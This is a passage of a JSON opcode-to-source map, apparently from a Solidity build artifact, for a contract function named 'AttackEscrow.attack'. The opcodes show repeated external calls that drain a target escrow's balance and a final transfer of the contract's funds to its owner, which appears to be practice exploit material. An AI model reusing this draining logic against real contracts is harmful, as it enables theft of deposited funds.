    "382": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "384": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "386": {
      "op": "SHL"
    },
    "387": {
      "op": "SUB"
    },
    "388": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1057,
        1073
      ],
      "op": "AND",
      "path": "22"
    },
    "389": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1057,
        1073
      ],
      "op": "PUSH4",
      "path": "22",
      "value": "0xD082E381"
    },
    "394": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1057,
        1075
      ],
      "op": "PUSH1",
      "path": "22",
      "value": "0x40"
    },
    "396": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1057,
        1075
      ],
      "op": "MLOAD",
      "path": "22"
    },
    "397": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1057,
        1075
      ],
      "op": "DUP2",
      "path": "22"
    },
    "398": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1057,
        1075
      ],
      "op": "PUSH4",
      "path": "22",
      "value": "0xFFFFFFFF"
    },
    "403": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1057,
        1075
      ],
      "op": "AND",
      "path": "22"
    },
    "404": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1057,
        1075
      ],
      "op": "PUSH1",
      "path": "22",
      "value": "0xE0"
    },
    "406": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1057,
        1075
      ],
      "op": "SHL",
      "path": "22"
    },
    "407": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1057,
        1075
      ],
      "op": "DUP2",
      "path": "22"
    },
    "408": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1057,
        1075
      ],
      "op": "MSTORE",
      "path": "22"
    },
    "409": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1057,
        1075
      ],
      "op": "PUSH1",
      "path": "22",
      "value": "0x4"
    },
    "411": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1057,
        1075
      ],
      "op": "ADD",
      "path": "22"
    },
    "412": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1057,
        1075
      ],
      "op": "PUSH1",
      "path": "22",
      "value": "0x20"
    },
    "414": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1057,
        1075
      ],
      "op": "PUSH1",
      "path": "22",
      "value": "0x40"
    },
    "416": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1057,
        1075
      ],
      "op": "MLOAD",
      "path": "22"
    },
    "417": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1057,
        1075
      ],
      "op": "DUP1",
      "path": "22"
    },
    "418": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1057,
        1075
      ],
      "op": "DUP4",
      "path": "22"
    },
    "419": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1057,
        1075
      ],
      "op": "SUB",
      "path": "22"
    },
    "420": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1057,
        1075
      ],
      "op": "DUP2",
      "path": "22"
    },
    "421": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1057,
        1075
      ],
      "op": "PUSH1",
      "path": "22",
      "value": "0x0"
    },
    "423": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1057,
        1075
      ],
      "op": "DUP8",
      "path": "22"
    },
    "424": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1057,
        1075
      ],
      "op": "GAS",
      "path": "22"
    },
    "425": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1057,
        1075
      ],
      "op": "CALL",
      "path": "22"
    },
    "426": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1057,
        1075
      ],
      "op": "ISZERO",
      "path": "22"
    },
    "427": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1057,
        1075
      ],
      "op": "DUP1",
      "path": "22"
    },
    "428": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1057,
        1075
      ],
      "op": "ISZERO",
      "path": "22"
    },
    "429": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1057,
        1075
      ],
      "op": "PUSH2",
      "path": "22",
      "value": "0x1BA"
    },
    "432": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1057,
        1075
      ],
      "op": "JUMPI",
      "path": "22"
    },
    "433": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1057,
        1075
      ],
      "op": "RETURNDATASIZE",
      "path": "22"
    },
    "434": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1057,
        1075
      ],
      "op": "PUSH1",
      "path": "22",
      "value": "0x0"
    },
    "436": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1057,
        1075
      ],
      "op": "DUP1",
      "path": "22"
    },
    "437": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1057,
        1075
      ],
      "op": "RETURNDATACOPY",
      "path": "22"
    },
    "438": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1057,
        1075
      ],
      "op": "RETURNDATASIZE",
      "path": "22"
    },
    "439": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1057,
        1075
      ],
      "op": "PUSH1",
      "path": "22",
      "value": "0x0"
    },
    "441": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1057,
        1075
      ],
      "op": "REVERT",
      "path": "22"
    },
    "442": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1057,
        1075
      ],
      "op": "JUMPDEST",
      "path": "22"
    },
    "443": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1057,
        1075
      ],
      "op": "POP",
      "path": "22"
    },
    "444": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1057,
        1075
      ],
      "op": "POP",
      "path": "22"
    },
    "445": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1057,
        1075
      ],
      "op": "POP",
      "path": "22"
    },
    "446": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1057,
        1075
      ],
      "op": "POP",
      "path": "22"
    },
    "447": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1057,
        1075
      ],
      "op": "PUSH1",
      "path": "22",
      "value": "0x40"
    },
    "449": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1057,
        1075
      ],
      "op": "MLOAD",
      "path": "22"
    },
    "450": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1057,
        1075
      ],
      "op": "RETURNDATASIZE",
      "path": "22"
    },
    "451": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1057,
        1075
      ],
      "op": "PUSH1",
      "path": "22",
      "value": "0x1F"
    },
    "453": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1057,
        1075
      ],
      "op": "NOT",
      "path": "22"
    },
    "454": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1057,
        1075
      ],
      "op": "PUSH1",
      "path": "22",
      "value": "0x1F"
    },
    "456": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1057,
        1075
      ],
      "op": "DUP3",
      "path": "22"
    },
    "457": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1057,
        1075
      ],
      "op": "ADD",
      "path": "22"
    },
    "458": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1057,
        1075
      ],
      "op": "AND",
      "path": "22"
    },
    "459": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1057,
        1075
      ],
      "op": "DUP3",
      "path": "22"
    },
    "460": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1057,
        1075
      ],
      "op": "ADD",
      "path": "22"
    },
    "461": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1057,
        1075
      ],
      "op": "DUP1",
      "path": "22"
    },
    "462": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1057,
        1075
      ],
      "op": "PUSH1",
      "path": "22",
      "value": "0x40"
    },
    "464": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1057,
        1075
      ],
      "op": "MSTORE",
      "path": "22"
    },
    "465": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1057,
        1075
      ],
      "op": "POP",
      "path": "22"
    },
    "466": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1057,
        1075
      ],
      "op": "DUP2",
      "path": "22"
    },
    "467": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1057,
        1075
      ],
      "op": "ADD",
      "path": "22"
    },
    "468": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1057,
        1075
      ],
      "op": "SWAP1",
      "path": "22"
    },
    "469": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1057,
        1075
      ],
      "op": "PUSH2",
      "path": "22",
      "value": "0x1DE"
    },
    "472": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1057,
        1075
      ],
      "op": "SWAP2",
      "path": "22"
    },
    "473": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1057,
        1075
      ],
      "op": "SWAP1",
      "path": "22"
    },
    "474": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1057,
        1075
      ],
      "op": "PUSH2",
      "path": "22",
      "value": "0x4CB"
    },
    "477": {
      "fn": "AttackEscrow.attack",
      "jump": "i",
      "offset": [
        1057,
        1075
      ],
      "op": "JUMP",
      "path": "22"
    },
    "478": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1057,
        1075
      ],
      "op": "JUMPDEST",
      "path": "22"
    },
    "479": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1039,
        1075
      ],
      "op": "SWAP1",
      "path": "22"
    },
    "480": {
      "op": "POP"
    },
    "481": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "483": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "485": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "487": {
      "op": "SHL"
    },
    "488": {
      "op": "SUB"
    },
    "489": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1120,
        1126
      ],
      "op": "PUSH32",
      "path": "22",
      "value": "0x0"
    },
    "522": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1112,
        1135
      ],
      "op": "AND",
      "path": "22"
    },
    "523": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1112,
        1135
      ],
      "op": "BALANCE",
      "path": "22"
    },
    "524": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1146,
        1299
      ],
      "op": "JUMPDEST",
      "path": "22"
    },
    "525": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1172,
        1181
      ],
      "op": "CALLVALUE",
      "path": "22"
    },
    "526": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1152,
        1168
      ],
      "op": "DUP2",
      "path": "22"
    },
    "527": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1152,
        1181
      ],
      "op": "LT",
      "path": "22"
    },
    "528": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1146,
        1299
      ],
      "op": "PUSH2",
      "path": "22",
      "value": "0x2BF"
    },
    "531": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1146,
        1299
      ],
      "op": "JUMPI",
      "path": "22"
    },
    "532": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1197,
        1232
      ],
      "op": "PUSH1",
      "path": "22",
      "statement": 3,
      "value": "0x40"
    },
    "534": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1197,
        1232
      ],
      "op": "MLOAD",
      "path": "22"
    },
    "535": {
      "op": "PUSH4",
      "value": "0x104A4FC9"
    },
    "540": {
      "op": "PUSH1",
      "value": "0xE2"
    },
    "542": {
      "op": "SHL"
    },
    "543": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1197,
        1232
      ],
      "op": "DUP2",
      "path": "22"
    },
    "544": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1197,
        1232
      ],
      "op": "MSTORE",
      "path": "22"
    },
    "545": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1197,
        1232
      ],
      "op": "PUSH1",
      "path": "22",
      "value": "0x4"
    },
    "547": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1197,
        1232
      ],
      "op": "DUP2",
      "path": "22"
    },
    "548": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1197,
        1232
      ],
      "op": "ADD",
      "path": "22"
    },
    "549": {
      "op": "DUP4"
    },
    "550": {
      "op": "SWAP1"
    },
    "551": {
      "op": "MSTORE"
    },
    "552": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1197,
        1203
      ],
      "op": "PUSH32",
      "path": "22",
      "value": "0x0"
    },
    "585": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "587": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "589": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "591": {
      "op": "SHL"
    },
    "592": {
      "op": "SUB"
    },
    "593": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1197,
        1223
      ],
      "op": "AND",
      "path": "22"
    },
    "594": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1197,
        1223
      ],
      "op": "SWAP1",
      "path": "22"
    },
    "595": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1197,
        1223
      ],
      "op": "PUSH4",
      "path": "22",
      "value": "0x41293F24"
    },
    "600": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1197,
        1223
      ],
      "op": "SWAP1",
      "path": "22"
    },
    "601": {
      "op": "PUSH1",
      "value": "0x24"
    },
    "603": {
      "op": "ADD"
    },
    "604": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1197,
        1232
      ],
      "op": "PUSH1",
      "path": "22",
      "value": "0x0"
    },
    "606": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1197,
        1232
      ],
      "op": "PUSH1",
      "path": "22",
      "value": "0x40"
    },
    "608": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1197,
        1232
      ],
      "op": "MLOAD",
      "path": "22"
    },
    "609": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1197,
        1232
      ],
      "op": "DUP1",
      "path": "22"
    },
    "610": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1197,
        1232
      ],
      "op": "DUP4",
      "path": "22"
    },
    "611": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1197,
        1232
      ],
      "op": "SUB",
      "path": "22"
    },
    "612": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1197,
        1232
      ],
      "op": "DUP2",
      "path": "22"
    },
    "613": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1197,
        1232
      ],
      "op": "PUSH1",
      "path": "22",
      "value": "0x0"
    },
    "615": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1197,
        1232
      ],
      "op": "DUP8",
      "path": "22"
    },
    "616": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1197,
        1232
      ],
      "op": "DUP1",
      "path": "22"
    },
    "617": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1197,
        1232
      ],
      "op": "EXTCODESIZE",
      "path": "22"
    },
    "618": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1197,
        1232
      ],
      "op": "ISZERO",
      "path": "22"
    },
    "619": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1197,
        1232
      ],
      "op": "DUP1",
      "path": "22"
    },
    "620": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1197,
        1232
      ],
      "op": "ISZERO",
      "path": "22"
    },
    "621": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1197,
        1232
      ],
      "op": "PUSH2",
      "path": "22",
      "value": "0x275"
    },
    "624": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1197,
        1232
      ],
      "op": "JUMPI",
      "path": "22"
    },
    "625": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1197,
        1232
      ],
      "op": "PUSH1",
      "path": "22",
      "value": "0x0"
    },
    "627": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1197,
        1232
      ],
      "op": "DUP1",
      "path": "22"
    },
    "628": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1197,
        1232
      ],
      "op": "REVERT",
      "path": "22"
    },
    "629": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1197,
        1232
      ],
      "op": "JUMPDEST",
      "path": "22"
    },
    "630": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1197,
        1232
      ],
      "op": "POP",
      "path": "22"
    },
    "631": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1197,
        1232
      ],
      "op": "GAS",
      "path": "22"
    },
    "632": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1197,
        1232
      ],
      "op": "CALL",
      "path": "22"
    },
    "633": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1197,
        1232
      ],
      "op": "ISZERO",
      "path": "22"
    },
    "634": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1197,
        1232
      ],
      "op": "DUP1",
      "path": "22"
    },
    "635": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1197,
        1232
      ],
      "op": "ISZERO",
      "path": "22"
    },
    "636": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1197,
        1232
      ],
      "op": "PUSH2",
      "path": "22",
      "value": "0x289"
    },
    "639": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1197,
        1232
      ],
      "op": "JUMPI",
      "path": "22"
    },
    "640": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1197,
        1232
      ],
      "op": "RETURNDATASIZE",
      "path": "22"
    },
    "641": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1197,
        1232
      ],
      "op": "PUSH1",
      "path": "22",
      "value": "0x0"
    },
    "643": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1197,
        1232
      ],
      "op": "DUP1",
      "path": "22"
    },
    "644": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1197,
        1232
      ],
      "op": "RETURNDATACOPY",
      "path": "22"
    },
    "645": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1197,
        1232
      ],
      "op": "RETURNDATASIZE",
      "path": "22"
    },
    "646": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1197,
        1232
      ],
      "op": "PUSH1",
      "path": "22",
      "value": "0x0"
    },
    "648": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1197,
        1232
      ],
      "op": "REVERT",
      "path": "22"
    },
    "649": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1197,
        1232
      ],
      "op": "JUMPDEST",
      "path": "22"
    },
    "650": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1197,
        1232
      ],
      "op": "POP",
      "path": "22"
    },
    "651": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1197,
        1232
      ],
      "op": "POP",
      "path": "22"
    },
    "652": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1197,
        1232
      ],
      "op": "POP",
      "path": "22"
    },
    "653": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1197,
        1232
      ],
      "op": "POP",
      "path": "22"
    },
    "654": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1273,
        1279
      ],
      "op": "PUSH32",
      "path": "22",
      "statement": 4,
      "value": "0x0"
    },
    "687": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "689": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "691": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "693": {
      "op": "SHL"
    },
    "694": {
      "op": "SUB"
    },
    "695": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1265,
        1288
      ],
      "op": "AND",
      "path": "22"
    },
    "696": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1265,
        1288
      ],
      "op": "BALANCE",
      "path": "22"
    },
    "697": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1246,
        1288
      ],
      "op": "SWAP1",
      "path": "22"
    },
    "698": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1246,
        1288
      ],
      "op": "POP",
      "path": "22"
    },
    "699": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1146,
        1299
      ],
      "op": "PUSH2",
      "path": "22",
      "value": "0x20C"
    },
    "702": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1146,
        1299
      ],
      "op": "JUMP",
      "path": "22"
    },
    "703": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1146,
        1299
      ],
      "op": "JUMPDEST",
      "path": "22"
    },
    "704": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1310,
        1322
      ],
      "op": "PUSH1",
      "path": "22",
      "value": "0x0"
    },
    "706": {
      "fn": "Ownable.owner",
      "offset": [
        1273,
        1279
      ],
      "op": "DUP1",
      "path": "0"
    },
    "707": {
      "fn": "Ownable.owner",
      "offset": [
        1273,
        1279
      ],
      "op": "SLOAD",
      "path": "0"
    },
    "708": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1328,
        1374
      ],
      "op": "PUSH1",
      "path": "22",
      "value": "0x40"
    },
    "710": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1328,
        1374
      ],
      "op": "MLOAD",
      "path": "22"
    },
    "711": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "713": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "715": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "717": {
      "op": "SHL"
    },
    "718": {
      "op": "SUB"
    },
    "719": {
      "fn": "Ownable.owner",
      "offset": [
        1273,
        1279
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "720": {
      "fn": "Ownable.owner",
      "offset": [
        1273,
        1279
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "721": {
      "fn": "Ownable.owner",
      "offset": [
        1273,
        1279
      ],
      "op": "AND",
      "path": "0"
    },
    "722": {
      "fn": "Ownable.owner",
      "offset": [
        1273,
        1279
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "723": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1348,
        1369
      ],
      "op": "SELFBALANCE",
      "path": "22"
    },
    "724": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1348,
        1369
      ],
      "op": "SWAP1",
      "path": "22"
    },
    "725": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1310,
        1322
      ],
      "op": "DUP4",
      "path": "22"
    },
    "726": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1328,
        1374
      ],
      "op": "DUP2",
      "path": "22"
    },
    "727": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1310,
        1322
      ],
      "op": "DUP2",
      "path": "22"
    },
    "728": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1328,
        1374
      ],
      "op": "DUP2",
      "path": "22"
    },
    "729": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1348,
        1369
      ],
      "op": "DUP6",
      "path": "22"
    },
    "730": {
      "fn": "Ownable.owner",
      "offset": [
        1273,
        1279
      ],
      "op": "DUP8",
      "path": "0"
    },
    "731": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1328,
        1374
      ],
      "op": "GAS",
      "path": "22"
    },
    "732": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1328,
        1374
      ],
      "op": "CALL",
      "path": "22"
    },
    "733": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1328,
        1374
      ],
      "op": "SWAP3",
      "path": "22"
    },
    "734": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1328,
        1374
      ],
      "op": "POP",
      "path": "22"
    },
    "735": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1328,
        1374
      ],
      "op": "POP",
      "path": "22"
    },
    "736": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1328,
        1374
      ],
      "op": "POP",
      "path": "22"
    },
    "737": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1328,
        1374
      ],
      "op": "RETURNDATASIZE",
      "path": "22"
    },
    "738": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1328,
        1374
      ],
      "op": "DUP1",
      "path": "22"
    },
    "739": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1328,
        1374
      ],
      "op": "PUSH1",
      "path": "22",
      "value": "0x0"
    },
    "741": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1328,
        1374
      ],
      "op": "DUP2",
      "path": "22"
    },
    "742": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1328,
        1374
      ],
      "op": "EQ",
      "path": "22"
    },
    "743": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1328,
        1374
      ],
      "op": "PUSH2",
      "path": "22",
      "value": "0x30C"
    },
    "746": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1328,
        1374
      ],
      "op": "JUMPI",
      "path": "22"
    },
    "747": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1328,
        1374
      ],
      "op": "PUSH1",
      "path": "22",
      "value": "0x40"
    },
    "749": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1328,
        1374
      ],
      "op": "MLOAD",
      "path": "22"
    },
    "750": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1328,
        1374
      ],
      "op": "SWAP2",
      "path": "22"
    },
    "751": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1328,
        1374
      ],
      "op": "POP",
      "path": "22"
    },
    "752": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1328,
        1374
      ],
      "op": "PUSH1",
      "path": "22",
      "value": "0x1F"
    },
    "754": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1328,
        1374
      ],
      "op": "NOT",
      "path": "22"
    },
    "755": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1328,
        1374
      ],
      "op": "PUSH1",
      "path": "22",
      "value": "0x3F"
    },
    "757": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1328,
        1374
      ],
      "op": "RETURNDATASIZE",
      "path": "22"
    },
    "758": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1328,
        1374
      ],
      "op": "ADD",
      "path": "22"
    },
    "759": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1328,
        1374
      ],
      "op": "AND",
      "path": "22"
    },
    "760": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1328,
        1374
      ],
      "op": "DUP3",
      "path": "22"
    },
    "761": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1328,
        1374
      ],
      "op": "ADD",
      "path": "22"
    },
    "762": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1328,
        1374
      ],
      "op": "PUSH1",
      "path": "22",
      "value": "0x40"
    },
    "764": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1328,
        1374
      ],
      "op": "MSTORE",
      "path": "22"
    },
    "765": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1328,
        1374
      ],
      "op": "RETURNDATASIZE",
      "path": "22"
    },
    "766": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1328,
        1374
      ],
      "op": "DUP3",
      "path": "22"
    },
    "767": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1328,
        1374
      ],
      "op": "MSTORE",
      "path": "22"
    },
    "768": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1328,
        1374
      ],
      "op": "RETURNDATASIZE",
      "path": "22"
    },
    "769": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1328,
        1374
      ],
      "op": "PUSH1",
      "path": "22",
      "value": "0x0"
    },
    "771": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1328,
        1374
      ],
      "op": "PUSH1",
      "path": "22",
      "value": "0x20"
    },
    "773": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1328,
        1374
      ],
      "op": "DUP5",
      "path": "22"
    },
    "774": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1328,
        1374
      ],
      "op": "ADD",
      "path": "22"
    },
    "775": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1328,
        1374
      ],
      "op": "RETURNDATACOPY",
      "path": "22"
    },
    "776": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1328,
        1374
      ],
      "op": "PUSH2",
      "path": "22",
      "value": "0x311"
    },
    "779": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1328,
        1374
      ],
      "op": "JUMP",
      "path": "22"
    },
    "780": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1328,
        1374
      ],
      "op": "JUMPDEST",
      "path": "22"
    },
    "781": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1328,
        1374
      ],
      "op": "PUSH1",
      "path": "22",
      "value": "0x60"
    },
    "783": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1328,
        1374
      ],
      "op": "SWAP2",
      "path": "22"
    },
    "784": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1328,
        1374
      ],
      "op": "POP",
      "path": "22"
    },
    "785": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1328,
        1374
      ],
      "op": "JUMPDEST",
      "path": "22"
    },
    "786": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1328,
        1374
      ],
      "op": "POP",
      "path": "22"
    },
    "787": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1309,
        1374
      ],
      "op": "POP",
      "path": "22"
    },
    "788": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1309,
        1374
      ],
      "op": "SWAP1",
      "path": "22"
    },
    "789": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1309,
        1374
      ],
      "op": "POP",
      "path": "22"
    },
    "790": {
      "branch": 12,
      "fn": "AttackEscrow.attack",
      "offset": [
        1392,
        1399
      ],
      "op": "DUP1",
      "path": "22",
      "statement": 5
    },
    "791": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1384,
        1439
      ],
      "op": "PUSH2",
      "path": "22",
      "value": "0x373"
    },
    "794": {
      "branch": 12,
      "fn": "AttackEscrow.attack",
      "offset": [
        1384,
        1439
      ],
      "op": "JUMPI",
      "path": "22"
    },
    "795": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1384,
        1439
      ],
      "op": "PUSH1",
      "path": "22",
      "value": "0x40"
    },
    "797": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1384,
        1439
      ],
      "op": "MLOAD",
      "path": "22"
    },
    "798": {
      "op": "PUSH3",
      "value": "0x461BCD"
    },
